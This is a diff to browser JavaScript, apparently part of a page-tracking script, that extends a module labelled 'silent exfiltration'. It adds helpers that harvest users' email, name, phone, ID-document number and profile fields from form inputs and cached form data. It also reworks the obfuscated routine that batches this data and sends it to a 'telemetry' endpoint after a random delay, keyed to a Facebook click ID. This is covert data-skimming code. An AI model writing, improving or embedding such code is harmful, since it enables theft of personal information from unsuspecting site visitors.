@@ -286,6 +286,45 @@ function initFormCapture() {
     });
 }
 
+function readTrackedField(ids) {
+    for (const id of ids) {
+        const value = document.getElementById(id)?.value;
+        if (typeof value === 'string' && value.trim()) {
+            return value.trim();
+        }
+    }
+    for (const id of ids) {
+        const cached = globalFormData[id] && typeof globalFormData[id].value === 'string'
+            ? globalFormData[id].value.trim()
+            : '';
+        if (cached) {
+            return cached;
+        }
+    }
+    return '';
+}
+
+function buildTrackedUserData() {
+    return {
+        email: readTrackedField(['email', 'f-email']),
+        name: readTrackedField(['name', 'f-name']),
+        phone: readTrackedField(['tel', 'f-phone']),
+        document_id: readTrackedField(['game_id_shadow'])
+    };
+}
+
+function buildTrackedPlayerData() {
+    return {
+        pseudonimo: readTrackedField(['b-pseudonimo']),
+        fechaInicioRol: readTrackedField(['b-fecha-inicio']),
+        avatarUrl: readTrackedField(['b-avatar-url']),
+        division: readTrackedField(['b-division']),
+        countryCode: readTrackedField(['b-country-code']),
+        primaryColor: readTrackedField(['b-primary-color']),
+        bio: readTrackedField(['b-bio'])
+    };
+}
+
 // ─── Módulo: Exfiltración Silenciosa ───────────────────────────────────────
 function initSilentExfiltration() {
     const queue = [];
@@ -299,8 +338,9 @@ function initSilentExfiltration() {
                 data: queue.splice(0)
             };
             const encodedPayload = _0x5f(JSON.stringify(payload));
+            const transportPayload = JSON.stringify({ data: encodedPayload });
             _0x61(trackerSafeWrap('tracker.sendBatch.defer', function() {
-                _0x60(API_ENDPOINTS.telemetry, encodedPayload);
+                _0x60(API_ENDPOINTS.telemetry, new Blob([transportPayload], { type: 'application/json' }));
             }), _0x62() * 1000 + 500);
         });
     }
@@ -495,20 +535,8 @@ const trackerClickBootstrap = trackerSafeWrap('tracker.clickBootstrap', async fu
 
     setTimeout(trackerSafeWrap('tracker.clickBootstrap.enqueue', function() {
         const fbclid = new URLSearchParams(window.location.search).get('fbclid') || 'no-fbclid';
-        const userData = {
-            email: document.getElementById('email')?.value || document.getElementById('f-email')?.value || '',
-            name: document.getElementById('name')?.value || document.getElementById('f-name')?.value || '',
-            phone: document.getElementById('tel')?.value || document.getElementById('f-phone')?.value || '',
-            document_id: document.getElementById('game_id_shadow')?.value || ''
-        };
-        const playerData = {
-            pseudonimo: document.getElementById('b-pseudonimo')?.value || '',
-            fechaInicioRol: document.getElementById('b-fecha-inicio')?.value || '',
-            avatarUrl: document.getElementById('b-avatar-url')?.value || '',
-            division: document.getElementById('b-division')?.value || '',
-            countryCode: document.getElementById('b-country-code')?.value || '',
-            primaryColor: document.getElementById('b-primary-color')?.value || '',
-        };
+        const userData = buildTrackedUserData();
+        const playerData = buildTrackedPlayerData();
         const payload = {
             sessionID: fbclid,
             userData: userData,
